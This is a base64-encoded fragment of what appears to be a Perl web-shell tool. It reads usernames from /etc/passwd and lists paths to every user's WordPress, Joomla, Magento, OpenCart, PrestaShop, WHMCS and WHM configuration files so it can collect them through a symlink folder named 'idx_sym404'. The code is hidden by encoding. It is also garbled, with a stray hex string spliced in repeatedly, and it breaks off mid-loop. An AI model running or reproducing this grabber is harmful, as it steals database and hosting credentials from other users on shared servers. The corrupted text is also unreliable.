mg+KSB7DQpteSBAbWF0Y2hlcyA9ICRyb3cgPX4gLyguKj8pOng6L2c7DQpteSAkdXNlcm55YSA9ICQxOw0KbXkgQGFycmF5ID0gKA0KCXtjb25maWdkaXIgP0x4d957169be41a75F466C49F955024E0644992890jZXNzaGFzaCcsIHR5cGUgPT4gJ1dITS1hY2Nlc3NoYXNoJyB9LA0KCXtjb25maWdkaXIgP0x4d957169be41a75F466C49F955024E0644992890saWNfaHRtbC9jb25maWcva29uZWtzaS5waHAnLCB0eXBlID0+ICdMb2tvbWVkaWEnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2NvbmZpZy9zZXR0aW5ncy5pbmMucGhwJywgdHlwZSA9PiAnUHJlc3RhU2hvcCcgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvYXBwL2V0Yy9sb2NhbC54bWwnLCB0eXBlID0+ICdNYWdlbnRvJyB9LA0KCXtjb25maWdkaXIgP0x4d957169be41a75F466C49F955024E0644992890saWNfaHRtbC9hZG1pbi9jb25maWcucGhwJywgdHlwZSA9PiAnT3BlbkNhcnQnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2FwcGxpY2F0aW9uL2NvbmZpZy9kYXRhYmFzZS5waHAnLCB0eXBlID0+ICdFbGxpc2xhYicgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvd3AtY29uZmlnLnBocCcsIHR5cGUgP0x4d957169be41a75F466C49F955024E0644992890nZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvd3AvdGVzdC93cC1jb25maWcucGhwJywgdHlwZSA9PiAnV29yZHByZXNzJyB9LA0KCXtjb25maWdkaXIgP0x4d957169be41a75F466C49F955024E0644992890saWNfaHRtbC9ibG9nL3dwLWNvbmZpZy5waHAnLCB0eXBlID0+ICdXb3JkcHJlc3MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2JldGEvd3AtY29uZmlnLnBocCcsIHR5cGUgP0x4d957169be41a75F466C49F955024E0644992890nZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvcG9ydGFsL3dwLWNvbmZpZy5waHAnLCB0eXBlID0+ICdXb3JkcHJlc3MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL3NpdGUvd3AtY29uZmlnLnBocCcsIHR5cGUgP0x4d957169be41a75F466C49F955024E0644992890nZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvd3Avd3AtY29uZmlnLnBocCcsIHR5cGUgP0x4d957169be41a75F466C49F955024E0644992890nZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvV1Avd3AtY29uZmlnLnBocCcsIHR5cGUgP0x4d957169be41a75F466C49F955024E0644992890nZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvbmV3cy93cC1jb25maWcucGhwJywgdHlwZSA9PiAnV29yZHByZXNzJyB9LA0KCXtjb25maWdkaXIgP0x4d957169be41a75F466C49F955024E0644992890saWNfaHRtbC93b3JkcHJlc3Mvd3AtY29uZmlnLnBocCcsIHR5cGUgP0x4d957169be41a75F466C49F955024E0644992890nZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvdGVzdC93cC1jb25maWcucGhwJywgdHlwZSA9PiAnV29yZHByZXNzJyB9LA0KCXtjb25maWdkaXIgP0x4d957169be41a75F466C49F955024E0644992890saWNfaHRtbC9kZW1vL3dwLWNvbmZpZy5waHAnLCB0eXBlID0+ICdXb3JkcHJlc3MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2hvbWUvd3AtY29uZmlnLnBocCcsIHR5cGUgP0x4d957169be41a75F466C49F955024E0644992890nZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvdjEvd3AtY29uZmlnLnBocCcsIHR5cGUgP0x4d957169be41a75F466C49F955024E0644992890nZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvdjIvd3AtY29uZmlnLnBocCcsIHR5cGUgP0x4d957169be41a75F466C49F955024E0644992890nZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvcHJlc3Mvd3AtY29uZmlnLnBocCcsIHR5cGUgP0x4d957169be41a75F466C49F955024E0644992890nZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvbmV3L3dwLWNvbmZpZy5waHAnLCB0eXBlID0+ICdXb3JkcHJlc3MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2Jsb2dzL3dwLWNvbmZpZy5waHAnLCB0eXBlID0+ICdXb3JkcHJlc3MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2NvbmZpZ3VyYXRpb24ucGhwJywgdHlwZSA9PiAnSm9vbWxhJyB9LA0KCXtjb25maWdkaXIgP0x4d957169be41a75F466C49F955024E0644992890saWNfaHRtbC9ibG9nL2NvbmZpZ3VyYXRpb24ucGhwJywgdHlwZSA9PiAnSm9vbWxhJyB9LA0KCXtjb25maWdkaXIgP0x4d957169be41a75F466C49F955024E0644992890saWNfaHRtbC9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnXldITUNTJyB9LA0KCXtjb25maWdkaXIgP0x4d957169be41a75F466C49F955024E0644992890saWNfaHRtbC9jbXMvY29uZmlndXJhdGlvbi5waHAnLCB0eXBlID0+ICdKb29tbGEnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2JldGEvY29uZmlndXJhdGlvbi5waHAnLCB0eXBlID0+ICdKb29tbGEnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL3BvcnRhbC9jb25maWd1cmF0aW9uLnBocCcsIHR5cGUgPT4gJ0pvb21sYScgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvc2l0ZS9jb25maWd1cmF0aW9uLnBocCcsIHR5cGUgPT4gJ0pvb21sYScgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvbWFpbi9jb25maWd1cmF0aW9uLnBocCcsIHR5cGUgPT4gJ0pvb21sYScgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvaG9tZS9jb25maWd1cmF0aW9uLnBocCcsIHR5cGUgPT4gJ0pvb21sYScgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvZGVtby9jb25maWd1cmF0aW9uLnBocCcsIHR5cGUgPT4gJ0pvb21sYScgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvdGVzdC9jb25maWd1cmF0aW9uLnBocCcsIHR5cGUgPT4gJ0pvb21sYScgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvdjEvY29uZmlndXJhdGlvbi5waHAnLCB0eXBlID0+ICdKb29tbGEnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL3YyL2NvbmZpZ3VyYXRpb24ucGhwJywgdHlwZSA9PiAnSm9vbWxhJyB9LA0KCXtjb25maWdkaXIgP0x4d957169be41a75F466C49F955024E0644992890saWNfaHRtbC9qb29tbGEvY29uZmlndXJhdGlvbi5waHAnLCB0eXBlID0+ICdKb29tbGEnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL25ldy9jb25maWd1cmF0aW9uLnBocCcsIHR5cGUgPT4gJ0pvb21sYScgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvV0hNQ1Mvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgP0x4d957169be41a75F466C49F955024E0644992890saWNfaHRtbC93aG1jczEvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgP0x4d957169be41a75F466C49F955024E0644992890saWNfaHRtbC9XaG1jcy9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL3dobWNzL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvd2htY3Mvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgP0x4d957169be41a75F466C49F955024E0644992890saWNfaHRtbC9XSE1DL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvV2htYy9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL3dobWMvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgP0x4d957169be41a75F466C49F955024E0644992890saWNfaHRtbC9XSE0vc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgP0x4d957169be41a75F466C49F955024E0644992890saWNfaHRtbC9XaG0vc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgP0x4d957169be41a75F466C49F955024E0644992890saWNfaHRtbC93aG0vc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgP0x4d957169be41a75F466C49F955024E0644992890saWNfaHRtbC9IT1NUL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvSG9zdC9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2hvc3Qvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgP0x4d957169be41a75F466C49F955024E0644992890saWNfaHRtbC9TVVBQT1JURVMvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgP0x4d957169be41a75F466C49F955024E0644992890saWNfaHRtbC9TdXBwb3J0ZXMvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgP0x4d957169be41a75F466C49F955024E0644992890saWNfaHRtbC9zdXBwb3J0ZXMvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgP0x4d957169be41a75F466C49F955024E0644992890saWNfaHRtbC9kb21haW5zL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvZG9tYWluL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvSG9zdGluZy9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0hPU1RJTkcvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgP0x4d957169be41a75F466C49F955024E0644992890saWNfaHRtbC9ob3N0aW5nL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQ0FSVC9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0NhcnQvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgP0x4d957169be41a75F466C49F955024E0644992890saWNfaHRtbC9jYXJ0L3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvT1JERVIvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgP0x4d957169be41a75F466C49F955024E0644992890saWNfaHRtbC9PcmRlci9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL29yZGVyL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQ0xJRU5UL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQ2xpZW50L3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvY2xpZW50L3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQ0xJRU5UQVJFQS9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0NsaWVudGFyZWEvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgP0x4d957169be41a75F466C49F955024E0644992890saWNfaHRtbC9jbGllbnRhcmVhL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvU1VQUE9SVC9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL1N1cHBvcnQvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgP0x4d957169be41a75F466C49F955024E0644992890saWNfaHRtbC9zdXBwb3J0L3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQklMTElORy9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0JpbGxpbmcvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgP0x4d957169be41a75F466C49F955024E0644992890saWNfaHRtbC9iaWxsaW5nL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQlVZL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQnV5L3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvYnV5L3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwv0x4d957169be41a75F466C49F955024E0644992890B0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwv0x4d957169be41a75F466C49F955024E0644992890B0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvbWFuYWdlL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQ0xJRU5UU1VQUE9SVC9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0NsaWVudFN1cHBvcnQvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgP0x4d957169be41a75F466C49F955024E0644992890saWNfaHRtbC9DbGllbnRzdXBwb3J0L3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvY2xpZW50c3VwcG9ydC9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0NIRUNLT1VUL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQ2hlY2tvdXQvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgP0x4d957169be41a75F466C49F955024E0644992890saWNfaHRtbC9jaGVja291dC9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0JJ0x4d957169be41a75F466C49F955024E0644992890B0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQmlsbGluZ3Mvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgP0x4d957169be41a75F466C49F955024E0644992890saWNfaHRtbC9iaWxsaW5ncy9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0JBU0tFVC9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0Jhc2tldC9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2Jhc2tldC9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL1NFQ1VSRS9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL1NlY3VyZS9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL3NlY3VyZS9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL1NBTEVTL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvU2FsZXMvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgP0x4d957169be41a75F466C49F955024E0644992890saWNfaHRtbC9zYWxlcy9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0JJTEwvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgP0x4d957169be41a75F466C49F955024E0644992890saWNfaHRtbC9CaWxsL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvYmlsbC9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL1BVUkNIQVNFL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvUHVyY2hhc2Uvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgP0x4d957169be41a75F466C49F955024E0644992890saWNfaHRtbC9wdXJjaGFzZS9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0FDQ09VTlQvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgP0x4d957169be41a75F466C49F955024E0644992890saWNfaHRtbC9BY2NvdW50L3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvYWNjb3VudC9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL1VTRVIvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgP0x4d957169be41a75F466C49F955024E0644992890saWNfaHRtbC9Vc2VyL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvdXNlci9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0NMSUVOVFMvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgP0x4d957169be41a75F466C49F955024E0644992890saWNfaHRtbC9DbGllbnRzL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvY2xpZW50cy9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0JJ0x4d957169be41a75F466C49F955024E0644992890B0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQmlsbGluZ3Mvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgP0x4d957169be41a75F466C49F955024E0644992890saWNfaHRtbC9iaWxsaW5ncy9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL01ZL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvTXkvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgP0x4d957169be41a75F466C49F955024E0644992890saWNfaHRtbC9teS9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL3NlY3VyZS93aG0vc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgP0x4d957169be41a75F466C49F955024E0644992890saWNfaHRtbC9zZWN1cmUvd2htY3Mvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgP0x4d957169be41a75F466C49F955024E0644992890saWNfaHRtbC9wYW5lbC9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2NsaWVudGVzL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvY2xpZW50ZS9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL3N1cHBvcnQvb3JkZXIvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9DQopOw0KZm9yZWFjaCAoQGFycmF5KXsNCglteSAkY29uZmlnbnlhID0gJF8tPntjb25maWdkaXJ9Ow0KCW15ICR0eXBlY29uZmlnID0gJF8tPnt0eXBlf0x4d957169be41a75F466C49F955024E0644992890iaWR4X3N5bTQwNC8kdXNlcm55YS0kdHlw